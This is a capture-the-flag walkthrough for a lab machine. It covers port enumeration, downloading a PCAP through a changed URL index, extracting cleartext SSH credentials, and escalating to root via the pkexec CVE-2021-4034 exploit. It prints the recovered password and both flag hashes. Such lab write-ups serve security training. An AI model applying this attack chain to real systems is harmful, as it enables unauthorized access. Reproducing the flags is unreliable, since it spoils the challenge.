# Solution CTF Walkthrough


## Enumeration

### Open Ports

    21/tcp open  ftp     vsftpd 3.0.3
    22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
    80/tcp open  http    Gunicorn

------------------------------------------------------------------------

## PCAP Analysis

Access the following URL:

    http://10.10.10.245/data/1

Replace **1 → 0** and press download for get the PCAP file.

Open the file in **Wireshark**, analyze the packets, and extract
cleartext credentials.

**Recovered credentials:**

    username: nathan
    password: Buck3tH4TF0RM3!

------------------------------------------------------------------------

## Gaining Access

### SSH Login

Use the recovered credentials:

    ssh nathan@10.10.10.245

### User Flag
In home dir use:

    cat user.txt
    
Output:

    fea736eff096e1f07f8ce16fe4cb25e0

------------------------------------------------------------------------

## Privilege Escalation

### SUID Discovery

A copy of **linpeas.sh** already exists in the user home directory. Run
it to identify privilege escalation vectors.

linpeas identifies a SUID binary:

    /usr/bin/pkexec

Check its version:

    /usr/bin/pkexec --version
    pkexec version 0.105

### pkexec Vulnerability

This version is vulnerable to: - **CVE-2021-4034: PolicyKit Local
Privilege Escalation** - Exploit: *"PolicyKit-1 0.105-31 - Privilege
Escalation"* - Source: Exploit-DB ID **50689**

### Exploitation
Follow all instructions provided in the exploit guide!

Compile the exploit using a Makefile:

    make all

Run it:

    ./exploit

You should now have a root shell:

    id
    uid=0(root) gid=0(root) groups=0(root)

------------------------------------------------------------------------

## Root Flag

Navigate to the root directory:

    cd /root
    cat root.txt

Output:

    6183650a61b41a0e6e1828f91c775456

**Rooted successfully!**

------------------------------------------------------------------------

## Notes

Although FTP credentials were exposed, SSH access was available with the
same login pair, making FTP unnecessary for completing the challenge.
